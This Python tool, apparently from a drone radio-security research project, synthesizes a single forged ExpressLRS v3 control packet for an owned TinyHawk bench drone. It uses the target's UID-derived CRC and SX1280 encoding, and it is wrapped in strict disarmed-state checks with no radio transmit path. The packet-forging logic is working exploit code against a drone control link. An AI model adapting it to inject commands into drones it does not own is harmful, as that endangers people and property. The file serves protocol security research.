#!/usr/bin/env python3
"""Build one fail-closed ELRS v3 bounded-RC injection canary.

This is an offline exploit-development artifact for the owned E8/TinyHawk
bench.  It synthesizes exactly one hybrid-RC packet that keeps AUX1 low,
throttle at the OTA minimum, pitch/yaw centered, and roll at either 1400 or
1600.  The target's live Betaflight AUX ranges and exact eight-channel RX map
must be supplied in a private ``betaflight-aux-safety-v3`` snapshot containing
repeated current channel observations.

The packet is stamped with the private UID-derived v3 CRC14 and encoded through
the project's source-traced SX1280 SF7 4/8 long-interleaver implementation.
The symbol round trip is a consistency check, not independent over-the-air
validation.  Output remains under ignored ``work/``, records
``transmit_enabled: false``, and contains no SDR, serial, or radio backend.
Receiver acceptance is not claimed.

Example::

  python tools/elrs-v3-bounded-rc-injection.py \
      --uid-file work/private-uid.hex \
      --aux-safety-json work/tinyhawk-aux-safety-v3.json \
      --roll-direction right \
      --private-plan-out work/bounded-rc-injection.json

Python 3.10+, standard library only.
"""

from __future__ import annotations

import argparse
import copy
import json
import runpy
import sys
import time
from pathlib import Path

TOOLS = Path(__file__).resolve().parent
REPLAY = runpy.run_path(str(TOOLS / "elrs-v3-rc-replay-canary.py"))

SCHEMA = "elrs-v3-bounded-rc-injection-v1"
REPLAY_SCHEMA = "elrs-v3-rc-replay-canary-v2"
ROLL_BY_DIRECTION = {"left": 1400, "right": 1600}
PITCH = 1500
YAW = 1500
THROTTLE = 988
SOURCE_NAME = "synthetic-bounded-rc-injection"
LIVE_AUX_SCHEMA = "betaflight-aux-safety-v3"
MAX_RC_EVIDENCE_AGE_NS = 5_000_000_000
MAX_RC_EVIDENCE_SPAN_NS = 1_000_000_000
MAX_RC_EVIDENCE_FUTURE_SKEW_NS = 1_000_000_000
SWITCH_3B_BY_PWM = {
    1000: 0,
    1275: 1,
    1425: 2,
    1575: 3,
    1725: 4,
    2000: 5,
    1500: 6,
}


def validate_live_evidence_freshness(aux_safety: dict, *,
                                     now_ns: int | None = None) -> list[int]:
    """Require a recent, ordered, tightly bounded live observation window."""
    if aux_safety.get("schema") != LIVE_AUX_SCHEMA:
        raise ValueError("bounded injection requires live RC-state evidence")
    stamps = aux_safety.get("observed_wall_time_ns")
    if (not isinstance(stamps, list) or len(stamps) < 3
            or any(isinstance(stamp, bool) or not isinstance(stamp, int)
                   or stamp <= 0 for stamp in stamps)):
        raise ValueError("live RC-state evidence has invalid timestamps")
    if any(after <= before for before, after in zip(stamps, stamps[1:])):
        raise ValueError("live RC-state timestamps are not strictly increasing")
    if stamps[-1] - stamps[0] > MAX_RC_EVIDENCE_SPAN_NS:
        raise ValueError("live RC-state sampling span is too large")
    current = time.time_ns() if now_ns is None else now_ns
    if (isinstance(current, bool) or not isinstance(current, int)
            or current <= 0):
        raise ValueError("invalid RC-state freshness clock")
    if stamps[-1] > current + MAX_RC_EVIDENCE_FUTURE_SKEW_NS:
        raise ValueError("live RC-state evidence is from the future")
    if current - stamps[-1] >= MAX_RC_EVIDENCE_AGE_NS:
        raise ValueError("live RC-state evidence is stale")
    return stamps


def _live_samples(aux_safety: dict) -> list[list[int]]:
    """Return stable, safe MSP_RC observations from a v3 private snapshot."""
    if (aux_safety.get("schema") != LIVE_AUX_SCHEMA
            or aux_safety.get("board_identifier")
            != REPLAY["EXPECTED_BOARD_IDENTIFIER"]
            or aux_safety.get("craft_name") != REPLAY["EXPECTED_CRAFT_NAME"]):
        raise ValueError("bounded injection requires live RC-state evidence")
    samples = aux_safety.get("observed_rc_samples_us")
    if (not isinstance(samples, list) or len(samples) < 3
            or any(not isinstance(sample, list) or len(sample) < 8
                   or any(isinstance(value, bool) or not isinstance(value, int)
                          or not 750 <= value <= 2250
                          for value in sample) for sample in samples)
            or len({len(sample) for sample in samples}) != 1):
        raise ValueError("live RC-state evidence is incomplete")
    stamps = validate_live_evidence_freshness(aux_safety)
    if len(stamps) != len(samples):
        raise ValueError("live RC-state evidence is incomplete")
    REPLAY["validate_arm_range"](aux_safety)
    for sample in samples:
        if (abs(sample[1] - PITCH) > 50
                or not THROTTLE <= sample[3] <= 1050
                or abs(sample[2] - YAW) > 50 or sample[4] != 1000):
            raise ValueError("observed controller state is not safely disarmed")
    return samples


def validate_live_controller_state(aux_safety: dict) -> list[list[int]]:
    """Require the verified map plus a fresh, stable, safely disarmed state."""
    if not REPLAY["rc_map_is_expected"](aux_safety):
        raise ValueError("live RC map does not match the verified target map")
    return _live_samples(aux_safety)


def select_preserved_switch(aux_safety: dict) -> tuple[int, int, int]:
    """Choose an unused rotating AUX and preserve its observed value exactly."""
    samples = validate_live_controller_state(aux_safety)
    # Indices 0..5 update AUX2..AUX7 using the source-defined 3-bit table.
    # The combined four-bit AUX8 form is deliberately excluded from the first
    # live canary because its selector and value share a bit.
    for switch_index in range(6):
        probe = {"switch_index": switch_index}
        channel_index = 5 + switch_index
        if channel_index >= len(samples[0]):
            break
        values = {sample[channel_index] for sample in samples}
        if (len(values) == 1 and next(iter(values)) in SWITCH_3B_BY_PWM
                and REPLAY["rotating_aux_is_unused"](probe, aux_safety)):
            pwm = next(iter(values))
            return switch_index, SWITCH_3B_BY_PWM[pwm], pwm
    raise ValueError("no stable, exactly encodable unused rotating AUX is available")


def _raw10(pwm: int) -> int:
    value = pwm - REPLAY["ANALOG_MIN"]
    if not 0 <= value <= 1023:
        raise ValueError("channel value is outside the OTA analog range")
    return value


def build_packet(uid: bytes, aux_safety: dict, direction: str) -> tuple[bytes, dict]:
    """Construct and independently decode one bounded, disarmed RC packet."""
    if direction not in ROLL_BY_DIRECTION:
        raise ValueError("roll direction must be left or right")
    switch_index, switch_value, _ = select_preserved_switch(aux_safety)
    # Verified target mapping: OTA slots are [throttle, roll, pitch, yaw].
    ota = [THROTTLE, ROLL_BY_DIRECTION[direction], PITCH, YAW]
    packed = sum(_raw10(value) << (10 * index)
                 for index, value in enumerate(ota))
    # ch4/AUX1 remains low and the rotating AUX retains its observed value.
    switch_byte = (switch_index << 3) | switch_value
    packet = bytearray((0,)) + bytearray(packed.to_bytes(5, "little"))
    packet.extend((switch_byte, 0))
    crc = REPLAY["crc14"](
        bytes((0,)) + bytes(packet[1:7]), REPLAY["uid_crc_init"](uid))
    packet[0] = ((crc >> 8) & 0x3F) << 2
    packet[7] = crc & 0xFF
    result = bytes(packet)
    rc = REPLAY["decode_hybrid_rc"](result)
    if rc is None:
        raise ValueError("constructed packet did not decode as RC data")
    ok, reason = REPLAY["safety_check"](rc, aux_safety)
    if not ok:
        raise ValueError(f"constructed packet failed safety validation: {reason}")
    return result, rc


def build_plan(uid: bytes, aux_safety: dict, direction: str) -> dict:
    packet, rc = build_packet(uid, aux_safety, direction)
    switch_index, switch_value, switch_pwm = select_preserved_switch(aux_safety)
    interleaver = REPLAY["verify_interleaver_round_trip"](packet)
    frame = {
        "line": 0,
        "source": SOURCE_NAME,
        "preamble_start_seconds": 0.0,
        "packet_hex": packet.hex(),
        "rc": rc,
    }
    plan = REPLAY["build_plan"](uid, frame, interleaver, aux_safety)
    plan["schema"] = SCHEMA
    plan["construction"] = {
        "kind": "synthesized_bounded_rc",
        "roll_direction": direction,
        "allowed_roll_values": sorted(ROLL_BY_DIRECTION.values()),
        "fixed_pitch": PITCH,
        "fixed_yaw": YAW,
        "fixed_throttle": THROTTLE,
        "aux1_preserved_low": True,
        "switch_index": switch_index,
        "switch_value_raw": switch_value,
        "preserved_switch_pwm": switch_pwm,
        "rc_state_observed_wall_time_ns": aux_safety[
            "observed_wall_time_ns"][-1],
        "rc_state_sample_count": len(aux_safety["observed_rc_samples_us"]),
    }
    plan["limitations"] = [
        "one synthesized disarmed control frame; not sustained takeover",
        "receiver acceptance of the candidate is not established",
        "fresh live SYNC timing and independently validated RF transport remain required",
        "current RC-state evidence must be refreshed before a live test",
        "no serial access, SDR access, RF transmission, or device changes",
    ]
    plan["aux_safety_evidence"] = {
        "schema": LIVE_AUX_SCHEMA,
        "board_identifier": REPLAY["EXPECTED_BOARD_IDENTIFIER"],
        "craft_name": REPLAY["EXPECTED_CRAFT_NAME"],
        "arm_range_proven": True,
        "rc_map": list(REPLAY["EXPECTED_RC_MAP"]),
        "rotating_aux_channel_index": REPLAY[
            "rotating_aux_channel_index"](rc),
        "rotating_aux_unused": True,
        "rotating_aux_preserved": True,
        "preserved_switch_pwm": switch_pwm,
        "rc_state_observed_wall_time_ns": aux_safety[
            "observed_wall_time_ns"][-1],
        "rc_state_sample_count": len(aux_safety["observed_rc_samples_us"]),
    }
    validate_injection_canary(plan, uid, aux_safety)
    return plan


def validate_injection_canary(plan: object, uid: bytes,
                              aux_safety: dict) -> dict:
    """Recompute every packet, safety, mapping, and construction invariant."""
    if not isinstance(plan, dict) or plan.get("schema") != SCHEMA:
        raise ValueError("not a bounded RC injection plan")
    construction = plan.get("construction")
    if not isinstance(construction, dict):
        raise ValueError("injection plan lacks construction evidence")
    direction = construction.get("roll_direction")
    switch_index, switch_value, switch_pwm = select_preserved_switch(aux_safety)
    expected_construction = {
        "kind": "synthesized_bounded_rc",
        "roll_direction": direction,
        "allowed_roll_values": sorted(ROLL_BY_DIRECTION.values()),
        "fixed_pitch": PITCH,
        "fixed_yaw": YAW,
        "fixed_throttle": THROTTLE,
        "aux1_preserved_low": True,
        "switch_index": switch_index,
        "switch_value_raw": switch_value,
        "preserved_switch_pwm": switch_pwm,
        "rc_state_observed_wall_time_ns": aux_safety[
            "observed_wall_time_ns"][-1],
        "rc_state_sample_count": len(aux_safety["observed_rc_samples_us"]),
    }
    if direction not in ROLL_BY_DIRECTION or construction != expected_construction:
        raise ValueError("injection construction evidence is invalid")
    expected_aux_evidence = {
        "schema": LIVE_AUX_SCHEMA,
        "board_identifier": REPLAY["EXPECTED_BOARD_IDENTIFIER"],
        "craft_name": REPLAY["EXPECTED_CRAFT_NAME"],
        "arm_range_proven": True,
        "rc_map": list(REPLAY["EXPECTED_RC_MAP"]),
        "rotating_aux_channel_index": switch_index + 1,
        "rotating_aux_unused": True,
        "rotating_aux_preserved": True,
        "preserved_switch_pwm": switch_pwm,
        "rc_state_observed_wall_time_ns": aux_safety[
            "observed_wall_time_ns"][-1],
        "rc_state_sample_count": len(aux_safety["observed_rc_samples_us"]),
    }
    if plan.get("aux_safety_evidence") != expected_aux_evidence:
        raise ValueError("injection AUX evidence is invalid")
    replay_plan = copy.deepcopy(plan)
    replay_plan["schema"] = REPLAY_SCHEMA
    replay_plan.pop("construction", None)
    replay_plan["aux_safety_evidence"] = {
        "schema": REPLAY["AUX_SAFETY_SCHEMA"],
        "board_identifier": REPLAY["EXPECTED_BOARD_IDENTIFIER"],
        "craft_name": REPLAY["EXPECTED_CRAFT_NAME"],
        "arm_range_proven": True,
        "rc_map": list(REPLAY["EXPECTED_RC_MAP"]),
        "rotating_aux_channel_index": switch_index + 1,
        "rotating_aux_unused": True,
    }
    frame = REPLAY["validate_rc_canary"](replay_plan, uid, aux_safety)
    packet = bytes.fromhex(frame["packet_hex"])
    rc = REPLAY["decode_hybrid_rc"](packet)
    expected_packet, _ = build_packet(uid, aux_safety, direction)
    if packet != expected_packet:
        raise ValueError("packet bytes disagree with bounded construction")
    expected = {
        "roll": ROLL_BY_DIRECTION[direction],
        "pitch": PITCH,
        "yaw": YAW,
        "throttle": THROTTLE,
    }
    if any(rc[name] != value for name, value in expected.items()):
        raise ValueError("packet channels disagree with bounded construction")
    if (rc["ch4_bit"] != 0 or rc["stubborn_ack"] != 0
            or rc["switch_value_raw"] != switch_value
            or rc["switch_index"] != switch_index
            or frame["source_line"] != 0
            or frame["source_file"] != SOURCE_NAME):
        raise ValueError("packet switch or provenance is not the bounded canary")
    return frame


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--uid-file", required=True, type=Path)
    parser.add_argument("--aux-safety-json", required=True, type=Path)
    parser.add_argument("--roll-direction", required=True,
                        choices=tuple(ROLL_BY_DIRECTION))
    parser.add_argument("--private-plan-out", required=True, type=Path)
    args = parser.parse_args(argv)
    try:
        private = REPLAY["require_private_path"]
        uid_path = private(args.uid_file)
        aux_path = private(args.aux_safety_json)
        output = private(args.private_plan_out)
        if output.exists():
            raise ValueError("refusing to overwrite an existing injection plan")
        uid = REPLAY["read_uid"](uid_path)
        aux_safety = REPLAY["read_aux_safety"](aux_path)
        plan = build_plan(uid, aux_safety, args.roll_direction)
        with output.open("x", encoding="utf-8", newline="\n") as stream:
            json.dump(plan, stream, indent=2, sort_keys=True)
            stream.write("\n")
        print(json.dumps({
            "schema": SCHEMA,
            "transmit_enabled": False,
            "packet_count": 1,
            "roll_direction": args.roll_direction,
            "roll": ROLL_BY_DIRECTION[args.roll_direction],
            "pitch_yaw_centered": True,
            "throttle_low": True,
            "disarmed": True,
            "rc_map_verified": True,
            "unused_rotating_aux_verified": True,
            "rotating_aux_preserved": True,
            "crc_valid": True,
            "interleaver_round_trip": True,
        }, sort_keys=True))
        return 0
    except (OSError, ValueError, KeyError, TypeError, json.JSONDecodeError) as exc:
        print(f"Bounded RC injection error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
